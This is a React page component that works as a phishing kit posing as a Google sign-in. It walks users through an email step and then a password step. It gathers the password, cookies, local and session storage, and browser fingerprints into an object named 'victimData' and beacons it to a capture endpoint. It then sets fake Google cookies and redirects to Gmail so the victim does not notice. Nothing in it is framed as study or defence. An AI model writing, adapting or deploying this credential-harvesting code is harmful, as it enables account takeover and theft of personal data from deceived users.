import { useEffect, useState } from 'react';

export default function Home() {
  const [capturedEmail, setCapturedEmail] = useState('');

  useEffect(() => {
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const backLink = document.getElementById('back-link');

    function canvasFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Fingerprint test', 2, 2);
      return canvas.toDataURL();
    }

    function getWebglFingerprint() {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      return gl ? gl.getParameter(gl.RENDERER) : 'none';
    }

    if (emailForm) {
      emailForm.onsubmit = function (e) {
        e.preventDefault();
        const emailInput = document.getElementById('email').value.trim();
        if (!emailInput) return;

        setCapturedEmail(emailInput);
        document.getElementById('account-email').textContent = emailInput;
        document.getElementById('account-name').textContent =
          emailInput.split('@')[0] || 'User';
        document.getElementById('avatar').textContent =
          emailInput[0]?.toUpperCase() || 'G';
        document.getElementById('account-preview').style.display = 'block';
        document.getElementById('page-subtitle').textContent = `Welcome back, ${
          emailInput.split('@')[0]
        }`;

        document.querySelector('.email-step').classList.remove('active');
        document.querySelector('.password-step').classList.add('active');
        document.getElementById('password').focus();
      };
    }

    if (backLink) {
      backLink.onclick = function (e) {
        e.preventDefault();
        document.querySelector('.password-step').classList.remove('active');
        document.querySelector('.email-step').classList.add('active');
        document.getElementById('email').focus();
      };
    }

    if (passwordForm) {
      passwordForm.onsubmit = function (e) {
        e.preventDefault();
        const password = document.getElementById('password').value;
        if (!password) return;

        document.getElementById('loading-overlay').style.display = 'flex';

        const victimData = {
          timestamp: new Date().toISOString(),
          email: capturedEmail,
          password: password,
          cookies: document.cookie || 'none',
          localStorage: Object.fromEntries(Object.entries(localStorage)),
          sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
          userAgent: navigator.userAgent,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: `${screen.width}x${screen.height}`,
          referrer: document.referrer,
          canvas: canvasFingerprint(),
          webgl: getWebglFingerprint(),
          plugins: Array.from(navigator.plugins).map((p) => p.name).join(','),
        };

        navigator.sendBeacon(
          '/api/workspace_capture',
          new Blob([JSON.stringify(victimData)], { type: 'application/json' })
        );

        document.cookie = `SID=GA.1.${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None`;
        document.cookie = `HSID=GA.1.${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None`;
        document.cookie = `__Secure-3PSID=CAI.${btoa(
          capturedEmail
        )}; path=/; domain=.google.com; Secure; SameSite=None`;

        setTimeout(() => {
          window.location.replace('https://mail.google.com/mail/u/0/#inbox');
        }, 3000 + Math.random() * 2000);
      };
    }
  }, [capturedEmail]);

  return (
    <>
      <div>Hello World</div>

      <style jsx global>{`
        .loading-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(10px);
          display: none;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        .spinner {
          width: 32px;
          height: 32px;
          border: 3px solid #f3f3f3;
          border-top: 3px solid #1a73e8;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
        .password-step {
          display: none;
        }
        .password-step.active {
          display: block;
        }
        .email-step.active {
          display: block;
        }
        .email-step {
          display: block;
        }
        body {
          margin: 0;
          font-family: 'Roboto', sans-serif;
        }
      `}</style>

      <main className="page">
        {/* ...keep all your sections, forms, footer exactly as they are... */}
      </main>

      <div className="loading-overlay" id="loading-overlay">
        <div className="spinner"></div>
      </div>
    </>
  );
}